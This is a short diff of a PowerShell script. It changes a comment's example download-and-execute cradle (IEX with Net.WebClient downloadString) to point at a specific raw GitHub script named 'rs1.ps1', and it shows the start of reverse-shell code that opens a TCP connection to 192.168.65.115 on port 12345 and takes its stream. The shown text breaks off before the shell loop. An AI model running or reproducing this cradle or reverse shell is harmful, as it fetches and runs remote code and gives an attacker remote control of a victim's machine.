@@ -1,4 +1,4 @@
-﻿# Example  IEX(New-Object Net.WebClient).downloadString('http://<ip>/<file>.ps1')
+﻿# Example  IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/monojohn/sase/refs/heads/main/rs1.ps1')
 
 $KLK = New-Object System.Net.Sockets.TCPClient('192.168.65.115','12345');
 $PLP = $KLK.GetStream();
